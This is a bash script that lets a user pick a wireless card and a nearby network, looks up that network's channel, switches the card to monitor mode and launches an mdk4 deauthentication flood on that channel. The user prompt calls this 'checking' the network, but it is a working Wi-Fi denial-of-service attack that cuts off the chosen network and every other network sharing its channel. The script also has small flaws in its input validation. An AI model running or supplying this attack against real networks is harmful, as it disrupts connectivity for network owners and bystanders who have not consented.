#!/bin/bash
if [ "$(id -u)" -ne 0 ]; then
	echo "This script must be run as root"
	exit 1
fi

clear
echo "Checking if mdk4 is installed"
sleep 1
if ! command -v mdk4 &>/dev/null; then
  echo "mdk4 is not installed on your system."
  echo "Installing mdk4"
  echo "sudo apt install mdk4 -y"
  exit 1
fi

echo "mdk4 is installed on your system."
sleep 1
clear
echo "Available WiFi Cards:"

# Use the 'iwconfig' command to list wireless interfaces
wifi_cards=($(iwconfig 2>/dev/null | grep -o '^[a-zA-Z0-9]*'))

# Display the available WiFi cards with numbers
for ((i=0; i<${#wifi_cards[@]}; i++)); do
    echo "$((i+1)). ${wifi_cards[i]}"
done

echo "Enter the number of the WiFi card you want to use:"
read selection

# Validate the selection
if [[ $selection -ge 1 && $selection -le ${#wifi_cards[@]} ]]; then
    selected_wifi_card="${wifi_cards[selection-1]}"
    echo "You selected: $selected_wifi_card"
else
    echo "Invalid selection. Please enter a valid number."
fi

# Check if the interface is in monitor mode
mode=$(iwconfig "$selected_wifi_card" | grep "Mode:Monitor")

if [ -n "$mode" ]; then
    # Interface is in monitor mode, switch it to normal mode
    sudo iwconfig $selected_wifi_card mode managed
fi

# List available WiFi network names (SSIDs) with corresponding numbers
echo "Please wait for available WiFi Networks:"
wifi_list=$(nmcli -f SSID dev wifi list | tail -n +2 | awk '$1 != "--" {print $1}')
num=1
for network in $wifi_list; do
    echo "$num. $network"
    num=$((num + 1))
done

# Prompt the user to select a network by number
read -p "Enter the number of the WiFi network you want to check: " selected_num

# Validate the selected number
if ! [[ "$selected_num" =~ ^[0-9]+$ ]]; then
    echo "Invalid input. Please enter a valid number."
    exit 1
fi

# Check if the selected number is within a valid range
if [ "$selected_num" -ge 1 ] && [ "$selected_num" -le "$num" ]; then
    selected_network=$(echo "$wifi_list" | awk -v num="$selected_num" 'NR == num')
    echo "Selected WiFi network: $selected_network"
else
    echo "Invalid selection. Please choose a valid number."
    exit 1
fi

# Get the channel number for the selected network
channel=$(nmcli -f SSID,CHAN dev wifi list | grep -w "$selected_network" | awk '{print $2}')
clear

echo "$selected_network is on channel $channel"
echo "you can check if there are other networks on the same channel with:"
echo " 'nmcli dev wifi list' "
while true; do
    read -p "Do you want to continue (y/n)? " choice
    case "$choice" in
        [Yy]* )
            # Add your code here for when the user chooses 'y'
            echo "Continuing..."
            break
            ;;
        [Nn]* )
            # Add your code here for when the user chooses 'n'
            echo "Exiting..."
            exit
            ;;
        * )
            echo "Please enter 'y' or 'n'."
            ;;
    esac
done

# Check if the network was found and display the channel if available
if [ -n "$channel" ]; then

    sudo iwconfig $selected_wifi_card mode monitor
    sudo mdk4 $selected_wifi_card d -c $channel

else
    echo "Network '$selected_network' not found or unable to retrieve channel information."
fi
sudo iwconfig $selected_wifi_card mode managed
